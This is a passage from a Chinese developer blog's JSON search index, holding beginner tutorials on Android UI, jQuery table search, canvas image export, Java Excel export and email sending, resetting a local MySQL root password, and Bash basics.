setContentView(R.layout.activity_main); listview = (ListView)findViewById(R.id.listview); datalist = new ArrayList&lt;Map&lt;String,String&gt;&gt;(); simp_Adapter = new SimpleAdapter(this,getData(),R.layout.item, new String[]&#123;\"title\",\"text\"&#125;,new int[]&#123;R.id.title,R.id.text&#125;); listview.setAdapter(simp_Adapter); &#125; private List&lt;Map&lt;String,String&gt;&gt; getData()&#123; String[] data_text = getResources().getStringArray(R.array.text_arr); String[] data_title = getResources().getStringArray(R.array.title_arr); for(int i=0;i&lt;data_text.length;i++)&#123; Map&lt;String,String&gt;map = new HashMap&lt;String,String&gt;(); map.put(\"title\",data_title[i]); map.put(\"text\",data_text[i]); datalist.add(map); &#125; return datalist; &#125;&#125; 其他文件保持不变即可。 至此，一个Android列表程序就实现了。 本文链接： http://www.meng.uno/articles/5d6c9819/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"}]},{"title":"Android实现输入框回车输入","slug":"android_enter","date":"2016-12-15T05:22:51.000Z","updated":"2018-02-09T10:46:20.915Z","comments":true,"path":"articles/e60b1ba5/","link":"","permalink":"http://www.meng.uno/articles/e60b1ba5/","excerpt":"用惯了iOS的各位在开发安卓程序或者使用安卓手机时，都会遇到这样一个问题：原本在iOS上都是回车输入，而到了Android上却需要点击按钮完成输入（对比两个系统上的QQ就发现了）。我一直在使用iOS系统，因为《软设》才着手Android开发，所以我就想能不能像iOS上的那样实现一个输入框+回车符完成输入呢？经过我查找资料，发现确实可以： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16","text":"用惯了iOS的各位在开发安卓程序或者使用安卓手机时，都会遇到这样一个问题：原本在iOS上都是回车输入，而到了Android上却需要点击按钮完成输入（对比两个系统上的QQ就发现了）。我一直在使用iOS系统，因为《软设》才着手Android开发，所以我就想能不能像iOS上的那样实现一个输入框+回车符完成输入呢？经过我查找资料，发现确实可以： 12345678910111213141516 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:weightSum=\"1\"&gt; &lt;EditText android:id=\"@+id/edit_message\" android:layout_margin=\"30dp\" android:layout_width=\"match_parent\" android:layout_height=\"80dp\" android:hint=\"请输入文本信息 ...\" android:imeOptions=\"actionSearch\" android:singleLine=\"true\"/&gt;&lt;/LinearLayout&gt; 在EditText中加入了imeOptions就可以将回车符转变成各种各样的功能： actionDone——回车符–&gt;完成 actionSend——回车符–&gt;发送 actionGo——回车符–&gt;前进 actionNext——回车符–&gt;下一项 actionNone——回车符–&gt;无动作 actionPrevious——回车符–&gt;上一项 actionSearch——回车符–&gt;搜索 actionUnspecified——回车符–&gt;未指定 actionSend——回车符–&gt;发送 又查阅资料发现：ime是Input Method Editors的缩写，也就是输入法编辑器，原来如此，不过想使用这个属性，必须加上android:inputType 或者 android:singleline=”true” 至此，就完成了Android回车符向iOS的转化！ 本文链接： http://www.meng.uno/articles/e60b1ba5/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"}]},{"title":"Android页面跳转","slug":"android_pages_jump","date":"2016-12-15T04:46:49.000Z","updated":"2018-02-09T10:46:20.917Z","comments":true,"path":"articles/1da18548/","link":"","permalink":"http://www.meng.uno/articles/1da18548/","excerpt":"前情提要 开发安卓单页面程序久了，必然会思考怎么开发像现在一般Android应用程序那样的多页面（指页面有跳转）程序，我也是在搜索了其他牛人的（海量）博客之后，才总结出如下的这点精华步骤（又要感慨一下国内搜索引擎之渣）！ 编写AndroidManifest.xml 首先，我们要确定我们需要怎样的跳转，既然跳转，无非就是自动跳转或者点击按钮，无论哪种，首先我们必须有两个界面（至少），所以在AndroidManifest.xml中，我们需要这样写： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24","text":"前情提要 开发安卓单页面程序久了，必然会思考怎么开发像现在一般Android应用程序那样的多页面（指页面有跳转）程序，我也是在搜索了其他牛人的（海量）博客之后，才总结出如下的这点精华步骤（又要感慨一下国内搜索引擎之渣）！ 编写AndroidManifest.xml 首先，我们要确定我们需要怎样的跳转，既然跳转，无非就是自动跳转或者点击按钮，无论哪种，首先我们必须有两个界面（至少），所以在AndroidManifest.xml中，我们需要这样写： 123456789101112131415161718192021222324 &lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"uno.meng.download\"&gt; &lt;application android:allowBackup=\"true\" android:icon=\"@mipmap/ic_launcher\" android:theme=\"@style/AppTheme\"&gt; &lt;activity android:name=\".MainActivity\" android:label=\"@string/app_name\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;activity android:name=\".ResultActivity\" android:label=\"@string/comeback\" android:parentActivityName=\".MainActivity\" &gt; &lt;meta-data android:name=\"android.support.PARENT_ACTIVITY\" android:value=\".MainActivity\"/&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 其中，每个 对应一个界面，从代码中可见，我将后一个页面加了一个返回前一个页面的“返回符”。 编写跳转前界面search.xml 由于我在此将介绍怎么使用按钮跳转（带输入），所以直接在主界面search.xml（名称随意）中声明这两个组件（按钮，输入框）： 123456789101112131415161718192021 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:weightSum=\"1\"&gt; &lt;EditText android:id=\"@+id/edit_message\" android:layout_margin=\"30dp\" android:layout_width=\"match_parent\" android:layout_height=\"80dp\" android:hint=\"请输入文本信息 ...\"/&gt; &lt;Button android:id=\"@+id/button\" android:text=\"点击提交 \" android:layout_margin=\"100dp\" android:layout_width=\"127dp\" android:layout_height=\"wrap_content\" android:onClick=\"sendMessage\" /&gt;&lt;/LinearLayout&gt; 可见，我对按钮加了一个onClick事件。 编写对应的MainActivity.java 在search.xml对应的MainActivity.java文件中我们写好onCreate方法（每个文件都会有）以及sendMessage方法： 123456789101112131415 public class MainActivity extends AppCompatActivity &#123; public final static String EXTRA_MESSAGE = \"uno.meng.download.MESSAGE\"; public void sendMessage()&#123; EditText editText = (EditText)findViewById(R.id.edit_message); String message = editText.getText().toString(); Intent intent = new Intent(this, ResultActivity.class); intent.putExtra(EXTRA_MESSAGE,message); startActivity(intent); &#125; @Override protected void onCreate(Bundle savedInstanceState)&#123; super.onCreate(savedInstanceState); setContentView(R.layout.search); &#125;&#125; 编写接收界面result.xml 然后到result.xml接收（我用的一个框来接收）： 123456789101112 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:weightSum=\"1\"&gt; &lt;TextView android:layout_margin=\"30dp\" android:layout_width=\"match_parent\" android:layout_height=\"80dp\"/&gt;&lt;/LinearLayout&gt; 编写接收对应的ResultActivity.java 编写对应的ResultActivity.java文件， 将从MainActivity.java接收来的文字打印到result.xml的框中： 123456789101112131415 public class ResultActivity extends AppCompatActivity&#123; private Intent intent; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.result); intent = getIntent(); String message = intent.getStringExtra(MainActivity.EXTRA_MESSAGE); System.out.println(message); TextView textview = new TextView(this); textview.setTextSize(100); textview.setText(message); setContentView(textview); &#125;&#125; 到此为止，已经完成了Android页面跳转！ 本文链接： http://www.meng.uno/articles/1da18548/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"}]},{"title":"表格搜索","slug":"tablesearch","date":"2016-12-13T04:29:32.000Z","updated":"2018-02-09T10:46:20.941Z","comments":true,"path":"articles/49d54823/","link":"","permalink":"http://www.meng.uno/articles/49d54823/","excerpt":"虽然表格的排列相当困难，但表格的搜索却非常容易。增加一个搜索输入，如果那里的值匹配到了任意一行的文本，则显示该行，并隐藏其他所有的行。使用jQuery来实现就像下面这么简单： 1 2 3 4 5 var allRows = $(\"tr\"); $(\"input#search\").on(\"keydown keyup\", function() { allRows.hide(); $(\"tr:contains('\" + $(this).val() + \"')\").show(); }); 没有看错，就是这么简单，如果是在实际应用中，可以这样来写： 先声明一个按钮： 1","text":"虽然表格的排列相当困难，但表格的搜索却非常容易。增加一个搜索输入，如果那里的值匹配到了任意一行的文本，则显示该行，并隐藏其他所有的行。使用jQuery来实现就像下面这么简单： 12345 var allRows = $(\"tr\");$(\"input#search\").on(\"keydown keyup\", function() &#123; allRows.hide(); $(\"tr:contains('\" + $(this).val() + \"')\").show();&#125;); 没有看错，就是这么简单，如果是在实际应用中，可以这样来写： 先声明一个按钮： 1 &lt;input type=\"search\" id=\"search\" placeholder=\"请输入内容……\"&gt; 在input框之后加入以下JavaScript代码： 123456789101112131415 &lt;script&gt;// Quick Table Search$('#search').keyup(function() &#123; var regex = new RegExp($('#search').val(), \"i\"); var rows = $('table tr:gt(0)'); rows.each(function (index) &#123; title = $(this).children(\"#title\").html() if (title.search(regex) != -1) &#123; $(this).show(); &#125; else &#123; $(this).hide(); &#125; &#125;);&#125;);&lt;/script&gt; 完美运行有木有！！！ 本文链接： http://www.meng.uno/articles/49d54823/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"使用JavaScript将页面导出为图片","slug":"canvas","date":"2016-12-13T04:20:18.000Z","updated":"2018-02-09T10:46:20.919Z","comments":true,"path":"articles/f03eda59/","link":"","permalink":"http://www.meng.uno/articles/f03eda59/","excerpt":"昨天心血来潮，突然想将我们组开发的网站上的“导出Excel”功能做一点拓展，于是就想能不能直接将网页表格导出为图片！ 在我的不懈搜索后（搜索过程中绝大部分博客上的博文要么相互抄袭要么没什么屁用），终于得到了“canvas2image.js”这个神奇的JavaScript脚本，具体使用办法见如下代码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 5","text":"昨天心血来潮，突然想将我们组开发的网站上的“导出Excel”功能做一点拓展，于是就想能不能直接将网页表格导出为图片！ 在我的不懈搜索后（搜索过程中绝大部分博客上的博文要么相互抄袭要么没什么屁用），终于得到了“canvas2image.js”这个神奇的JavaScript脚本，具体使用办法见如下代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 &lt;!doctype html&gt;&lt;html&gt;&lt;script src=\"canvas2image.js\"&gt;&lt;/script&gt;&lt;body&gt; &lt;canvas id=\"cvs\"&gt;&lt;/canvas&gt; &lt;button id=\"save\"&gt;save&lt;/button&gt;&lt;script&gt; var canvas, ctx, bMouseIsDown = false, iLastX, iLastY, $save, $imgs, $convert, $imgW, $imgH, $sel; function init ()&#123; canvas = document.getElementById('cvs'); ctx = canvas.getContext('2d'); $save = document.getElementById('save'); $convert = document.getElementById('convert'); $sel = \"png\"; $imgs = document.getElementById('imgs'); $imgW = 1980; $imgH = 2000; bind(); draw(); &#125; function bind () &#123; canvas.onmousedown = function(e) &#123; bMouseIsDown = true; iLastX = e.clientX - canvas.offsetLeft + (window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft); iLastY = e.clientY - canvas.offsetTop + (window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop); &#125; canvas.onmouseup = function() &#123; bMouseIsDown = false; iLastX = -1; iLastY = -1; &#125; canvas.onmousemove = function(e) &#123; if (bMouseIsDown) &#123; var iX = e.clientX - canvas.offsetLeft + (window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft); var iY = e.clientY - canvas.offsetTop + (window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop); ctx.moveTo(iLastX, iLastY); ctx.lineTo(iX, iY); ctx.stroke(); iLastX = iX; iLastY = iY; &#125; &#125;; $save.onclick = function (e) &#123; var type = $sel.value, w = $imgW.value, h = $imgH.value; Canvas2Image.saveAsImage(canvas, w, h, type); &#125; &#125; onload = init;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 本文链接： http://www.meng.uno/articles/f03eda59/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"Java导出Excel","slug":"java2excel","date":"2016-12-06T14:16:48.000Z","updated":"2018-02-09T10:46:20.923Z","comments":true,"path":"articles/7725d215/","link":"","permalink":"http://www.meng.uno/articles/7725d215/","excerpt":"完成这个实验，你需要下载jxljar包，具体方法自行百度。 接下来我将直接使用具体代码进行讲解我的实现过程。 文件名： ExcelAction.java 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77","text":"完成这个实验，你需要下载jxljar包，具体方法自行百度。 接下来我将直接使用具体代码进行讲解我的实现过程。 文件名： ExcelAction.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 package net.kuangmeng.excel;/*这里是所有需要导入的库，不用担心当你写好其他代码时，编辑器会提示或者自动帮你补全！*/import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.util.ArrayList;import java.util.List;import com.opensymphony.xwork2.ActionSupport;import jxl.Workbook;import jxl.format.Alignment;import jxl.format.Colour;import jxl.format.UnderlineStyle;import jxl.format.VerticalAlignment;import jxl.write.Label;import jxl.write.WritableCellFormat;import jxl.write.WritableFont;import jxl.write.WritableSheet;import jxl.write.WritableWorkbook;import jxl.write.WriteException;import jxl.write.biff.RowsExceededException;@SuppressWarnings(\"serial\")public class ExcelAction extends ActionSupport&#123; public static void main(String[] args) &#123; //主函数调用 //listth为导出excel的表头信息 list&lt;String&gt; listth = new ArrayList&lt;String&gt;; //listtd为导出的excel表项 list&lt;String&gt; listtd = new ArrayList&lt;String&gt;; //num为表的列数 int num ; exportExcel(tablename,listth,listtd,num); &#125;//真正的导出excel方法 public static void exportExcel(String fileName,List&lt;String&gt; listth,List&lt;String&gt; listtd,int num) &#123; //设置保存文件具体位置及文件名 String excelName =\"C:\\\\Users\\\\meng\\\\Desktop\\\\\"+fileName+\".xls\"; try &#123; File excelFile = new File(excelName); // 如果文件存在就删除它 if (excelFile.exists()) excelFile.delete(); // 打开文件 WritableWorkbook book = Workbook.createWorkbook(excelFile); // 生成名为“第一页”的工作表，参数0表示这是第一页 WritableSheet sheet = book.createSheet(\"Up2U导出表格 \", 0); // 文字样式 jxl.write.WritableFont wfc = new jxl.write.WritableFont( WritableFont.ARIAL, 10, WritableFont.NO_BOLD, false, UnderlineStyle.NO_UNDERLINE, jxl.format.Colour.BLACK); jxl.write.WritableCellFormat wcfFC = new jxl.write.WritableCellFormat( wfc); jxl.write.WritableCellFormat wcfF = new jxl.write.WritableCellFormat(wfc); wcfF.setBackground(jxl.format.Colour.BLACK); // 设置单元格样式 wcfFC.setBackground(jxl.format.Colour.GRAY_25);// 单元格颜色 wcfFC.setAlignment(jxl.format.Alignment.CENTRE);// 单元格居中 // 在Label对象的构造子中指名单元格位置是第一列第一行(0,0) // 以及单元格内容为 for(int i=0;i&lt;listth.size()/(num-2);i++)&#123; for(int j=0;j&lt;num-2;j++)&#123; sheet.addCell(new Label(j,i,listth.get(i*(num-2)+j),wcfFC)); &#125; &#125; for(int i=listth.size()/(num-2);i&lt;(listth.size()+listtd.size())/(num-2);i++)&#123; for(int j=0;j&lt;num-2;j++)&#123; sheet.addCell(new Label(j,i,listtd.get((i-1)*(num-2)+j),wcfF)); &#125; &#125; // 写入数据并关闭文件 book.write(); book.close(); System.out.println(\"Excel创建成功\"); &#125; catch (Exception e) &#123; System.out.println(e); &#125; &#125;&#125; 本文链接： http://www.meng.uno/articles/7725d215/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"Mac MySQL无法启动解决方案","slug":"mysql_error","date":"2016-12-06T13:24:05.000Z","updated":"2018-02-09T10:46:20.929Z","comments":true,"path":"articles/115ed5e0/","link":"","permalink":"http://www.meng.uno/articles/115ed5e0/","excerpt":"正像这次博客的日期那样，《软工》大项目接近尾声了，然而直到今天我才真正解决了这个大难题——Mac MySQL无法使用！！！ 检查MySQL是否成功安装 1 mysql --version 关闭MySQL连接（即使没连也无妨） 1 sudo /usr/local/mysql/support-files/mysql.server stop 登录管理员 1 2 cd /usr/local/mysql/bin/ sudo su 禁止MySQL验证来登录（此时不验证密码） 1 ./mysqld_safe --skip-grant-tables & （此时应该成功","text":"正像这次博客的日期那样，《软工》大项目接近尾声了，然而直到今天我才真正解决了这个大难题——Mac MySQL无法使用！！！ 检查MySQL是否成功安装 1 mysql --version 关闭MySQL连接（即使没连也无妨） 1 sudo /usr/local/mysql/support-files/mysql.server stop 登录管理员 12 cd /usr/local/mysql/bin/sudo su 禁止MySQL验证来登录（此时不验证密码） 1 ./mysqld_safe --skip-grant-tables &amp; （此时应该成功进入mysql&gt;）设置密码 1 UPDATE mysql.user SET authentication_string=PASSWORD('*****') WHERE User='root'; （若显示密码过期）设置密码永不过期 1 ALTER USER 'root'@'localhost' PASSWORD EXPIRE NEVER; 刷新MySQL的系统权限 1 flush privileges; 至此应该来说MySQL应该好使了。 本文链接： http://www.meng.uno/articles/115ed5e0/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"Java发送邮件","slug":"javamail","date":"2016-12-04T14:30:34.000Z","updated":"2018-02-09T10:46:20.925Z","comments":true,"path":"articles/21f3b9c2/","link":"","permalink":"http://www.meng.uno/articles/21f3b9c2/","excerpt":"我觉得学会Java mail是一件很自豪的事，怎么说呢，邮箱这么有逼格的东西都能被你玩的很溜的话，一定不一般。 本次试验使用了 javax.mail.jarjar包，请自行百度下载。 我实现的Java mail主要包括4个部分： 1. 发送邮件使用的基本信息 2. 邮件发送器 3. 发件人设置 4. 实际发送 四个部分组成。 发送邮件使用的基本信息 文件名：MailSenderInfo.java 代码如下，我仍然以备注的形式讲解： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28","text":"我觉得学会Java mail是一件很自豪的事，怎么说呢，邮箱这么有逼格的东西都能被你玩的很溜的话，一定不一般。 本次试验使用了 javax.mail.jarjar包，请自行百度下载。 我实现的Java mail主要包括4个部分： 发送邮件使用的基本信息 邮件发送器 发件人设置 实际发送 四个部分组成。 发送邮件使用的基本信息 文件名：MailSenderInfo.java 代码如下，我仍然以备注的形式讲解： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495 package net.kuangmeng.mail; /** * 发送邮件需要使用的基本信息 */ import java.util.Properties; public class MailSenderInfo &#123; // 发送邮件的服务器的IP和端口 private String mailServerHost; private String mailServerPort = \"25\"; // 邮件发送者的地址 private String fromAddress; // 邮件接收者的地址 private String toAddress; // 登陆邮件发送服务器的用户名和密码 private String userName; private String password; // 是否需要身份验证 private boolean validate = false; // 邮件主题 private String subject; // 邮件的文本内容 private String content; // 邮件附件的文件名 private String[] attachFileNames; /** * 获得邮件会话属性 */ public Properties getProperties()&#123; Properties p = new Properties(); p.put(\"mail.smtp.host\", this.mailServerHost); p.put(\"mail.smtp.port\", this.mailServerPort); p.put(\"mail.smtp.auth\", validate ? \"true\" : \"false\"); return p; &#125; public String getMailServerHost() &#123; return mailServerHost; &#125; public void setMailServerHost(String mailServerHost) &#123; this.mailServerHost = mailServerHost; &#125; public String getMailServerPort() &#123; return mailServerPort; &#125; public void setMailServerPort(String mailServerPort) &#123; this.mailServerPort = mailServerPort; &#125; public boolean isValidate() &#123; return validate; &#125; public void setValidate(boolean validate) &#123; this.validate = validate; &#125; public String[] getAttachFileNames() &#123; return attachFileNames; &#125; public void setAttachFileNames(String[] fileNames) &#123; this.attachFileNames = fileNames; &#125; public String getFromAddress() &#123; return fromAddress; &#125; public void setFromAddress(String fromAddress) &#123; this.fromAddress = fromAddress; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String getToAddress() &#123; return toAddress; &#125; public void setToAddress(String toAddress) &#123; this.toAddress = toAddress; &#125; public String getUserName() &#123; return userName; &#125; public void setUserName(String userName) &#123; this.userName = userName; &#125; public String getSubject() &#123; return subject; &#125; public void setSubject(String subject) &#123; this.subject = subject; &#125; public String getContent() &#123; return content; &#125; public void setContent(String textContent) &#123; this.content = textContent; &#125; &#125; 邮件发送器 文件名：SimpleMailSender.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105 package net.kuangmeng.mail;import java.util.Date; import java.util.Properties; import javax.mail.Address; import javax.mail.BodyPart; import javax.mail.Message; import javax.mail.MessagingException; import javax.mail.Multipart; import javax.mail.Session; import javax.mail.Transport; import javax.mail.internet.InternetAddress; import javax.mail.internet.MimeBodyPart; import javax.mail.internet.MimeMessage; import javax.mail.internet.MimeMultipart; /** * 简单邮件（不带附件的邮件）发送器 */ public class SimpleMailSender &#123; /** * 以文本格式发送邮件 * @param mailInfo 待发送的邮件的信息 */ public boolean sendTextMail(MailSenderInfo mailInfo) &#123; // 判断是否需要身份认证 MyAuthenticator authenticator = null; Properties pro = mailInfo.getProperties(); if (mailInfo.isValidate()) &#123; // 如果需要身份认证，则创建一个密码验证器 authenticator = new MyAuthenticator(mailInfo.getUserName(), mailInfo.getPassword()); &#125; // 根据邮件会话属性和密码验证器构造一个发送邮件的session Session sendMailSession = Session.getDefaultInstance(pro,authenticator); try &#123; // 根据session创建一个邮件消息 Message mailMessage = new MimeMessage(sendMailSession); // 创建邮件发送者地址 Address from = new InternetAddress(mailInfo.getFromAddress()); // 设置邮件消息的发送者 mailMessage.setFrom(from); // 创建邮件的接收者地址，并设置到邮件消息中 Address to = new InternetAddress(mailInfo.getToAddress()); mailMessage.setRecipient(Message.RecipientType.TO,to); // 设置邮件消息的主题 mailMessage.setSubject(mailInfo.getSubject()); // 设置邮件消息发送的时间 mailMessage.setSentDate(new Date()); // 设置邮件消息的主要内容 String mailContent = mailInfo.getContent(); mailMessage.setText(mailContent); // 发送邮件 Transport.send(mailMessage); return true; &#125; catch (MessagingException ex) &#123; ex.printStackTrace(); &#125; return false; &#125; /** * 以HTML格式发送邮件 * @param mailInfo 待发送的邮件信息 */ public static boolean sendHtmlMail(MailSenderInfo mailInfo)&#123; // 判断是否需要身份认证 MyAuthenticator authenticator = null; Properties pro = mailInfo.getProperties(); //如果需要身份认证，则创建一个密码验证器 if (mailInfo.isValidate()) &#123; authenticator = new MyAuthenticator(mailInfo.getUserName(), mailInfo.getPassword()); &#125; // 根据邮件会话属性和密码验证器构造一个发送邮件的session Session sendMailSession = Session.getDefaultInstance(pro,authenticator); try &#123; // 根据session创建一个邮件消息 Message mailMessage = new MimeMessage(sendMailSession); // 创建邮件发送者地址 Address from = new InternetAddress(mailInfo.getFromAddress()); // 设置邮件消息的发送者 mailMessage.setFrom(from); // 创建邮件的接收者地址，并设置到邮件消息中 Address to = new InternetAddress(mailInfo.getToAddress()); // Message.RecipientType.TO属性表示接收者的类型为TO mailMessage.setRecipient(Message.RecipientType.TO,to); // 设置邮件消息的主题 mailMessage.setSubject(mailInfo.getSubject()); // 设置邮件消息发送的时间 mailMessage.setSentDate(new Date()); // MiniMultipart类是一个容器类，包含MimeBodyPart类型的对象 Multipart mainPart = new MimeMultipart(); // 创建一个包含HTML内容的MimeBodyPart BodyPart html = new MimeBodyPart(); // 设置HTML内容 html.setContent(mailInfo.getContent(), \"text/html; charset=utf-8\"); mainPart.addBodyPart(html); // 将MiniMultipart对象设置为邮件内容 mailMessage.setContent(mainPart); // 发送邮件 Transport.send(mailMessage); return true; &#125; catch (MessagingException ex) &#123; ex.printStackTrace(); &#125; return false; &#125; &#125; 发件人设置 文件名：MyAuthenticator.java 1234567891011121314151617 package net.kuangmeng.mail;import javax.mail.*; public class MyAuthenticator extends Authenticator&#123; String userName=null; String password=null; public MyAuthenticator()&#123; &#125; public MyAuthenticator(String username, String password) &#123; this.userName = username; this.password = password; &#125; protected PasswordAuthentication getPasswordAuthentication()&#123; return new PasswordAuthentication(userName, password); &#125; &#125; 实际发送 文件名：MailAction.java package net.kuangmeng.mail; import net.kuangmeng.*; public class MailAction { @SuppressWarnings(&quot;static-access&quot;) public static void main(String[] args){ //这个类主要是设置邮件 MailSenderInfo mailInfo = new MailSenderInfo(); mailInfo.setMailServerHost(&quot;smtp.yeah.net&quot;); mailInfo.setMailServerPort(&quot;25&quot;); mailInfo.setValidate(true); mailInfo.setUserName(&quot;*****@yeah.net&quot;); mailInfo.setPassword(&quot;******&quot;);//您的邮箱密码 mailInfo.setFromAddress(&quot;*****@yeah.net&quot;); mailInfo.setToAddress(&quot;****@qq.com&quot;); mailInfo.setSubject(&quot;你好！&quot;);//邮件主题 mailInfo.setContent(&quot;这是一个测试&quot;);//邮件内容 //这个类主要来发送邮件 SimpleMailSender sms = new SimpleMailSender(); sms.sendTextMail(mailInfo);//发送文体格式 sms.sendHtmlMail(mailInfo);//发送html格式 } } 本文链接： http://www.meng.uno/articles/21f3b9c2/ 欢迎转载！","categories":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/categories/软件工程/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"http://www.meng.uno/tags/软件工程/"}]},{"title":"Bash的使用","slug":"bash","date":"2016-12-03T09:23:17.000Z","updated":"2018-02-09T10:46:20.918Z","comments":true,"path":"articles/19f2d195/","link":"","permalink":"http://www.meng.uno/articles/19f2d195/","excerpt":"显示 “Hello world!” echo Hello world! 每一句指令以换行或分号隔开： echo ‘This is the first line’; echo ‘This is the second line’ 声明一个变量： Variable=“Some string” ***这是错误的做法：***Variable = “Some string” ***原因：***Bash 会把 Variable 当做一个指令，由于找不到该指令，因此这里会报错。 ***也不可以这样：***Variable= ‘Some string’ ***原因：***Bash 会认为 ‘Some","text":"显示 “Hello world!” echo Hello world! 每一句指令以换行或分号隔开： echo ‘This is the first line’; echo ‘This is the second line’ 声明一个变量： Variable=“Some string” ***这是错误的做法：***Variable = “Some string” ***原因：***Bash 会把 Variable 当做一个指令，由于找不到该指令，因此这里会报错。 ***也不可以这样：***Variable= ‘Some string’ ***原因：***Bash 会认为 ‘Some string’ 是一条指令，由于找不到该指令，这里再次报错。这个例子中 ‘Variable=’ 这部分会被当作仅对 ‘Some string’ 起作用的赋值。） 使用变量： 123 echo $Variableecho \"$Variable\"echo '$Variable' 当你赋值 (assign) 、导出 (export)，或者以其他方式使用变量时，变量名前不加 $。如果要使用变量的值， 则要加 $。 注意: ’ (单引号) 不会展开变量（即会屏蔽掉变量）。 在变量内部进行字符串代换 echo ${Variable/Some/A} 会把 Variable 中首次出现的 “some” 替换成 “A”。 变量的截取 Length=7 echo ${Variable:0:Length} 这样会仅返回变量值的前7个字符 变量的默认值 echo ${Foo:-“DefaultValueIfFooIsMissingOrEmpty”} 对 null (Foo=) 和空串 (Foo=&quot;&quot;) 起作用； 零（Foo=0）时返回0 注意这仅返回默认值而不是改变变量的值 内置变量： 下面的内置变量很有用 12345 echo \"Last program return value: $?\"echo \"Script's PID: $$\"echo \"Number of arguments: $#\"echo \"Scripts arguments: $@\"echo \"Scripts arguments separated in different variables: $1 $2...\" 读取输入： 123 echo \"What's your name?\"read Name # 这里不需要声明新变量echo Hello, $Name! 通常的 if 结构看起来像这样： ’man test’ 可查看更多的信息 123456 if [ $Name -ne $USER ]then echo \"Your name isn't your username\"else echo \"Your name is your username\"fi 根据上一个指令执行结果决定是否执行下一个指令 12 echo \"Always executed\" || echo \"Only executed if first command fails\"echo \"Always executed\" &amp;&amp; echo \"Only executed if first command does NOT fail\" 在 if 语句中使用 &amp;&amp; 和 || 需要多对方括号 123456789 if [ $Name == \"Steve\" ] &amp;&amp; [ $Age -eq 15 ]then echo \"This will run if $Name is Steve AND $Age is 15.\"fiif [ $Name == \"Daniya\" ] || [ $Name == \"Zach\" ]then echo \"This will run if $Name is Daniya OR Zach.\"fi 表达式的格式如下: echo $(( 10 + 5 )) 指令可以带有选项： 与其他编程语言不同的是，bash 运行时依赖上下文。比如，使用 ls 时，列出当前目录。 -l``` 列出文件和目录的详细信息 12345 ## 前一个指令的输出可以当作后一个指令的输入。```grep``` 用来匹配字符串。## 用下面的指令列出当前目录下所有的 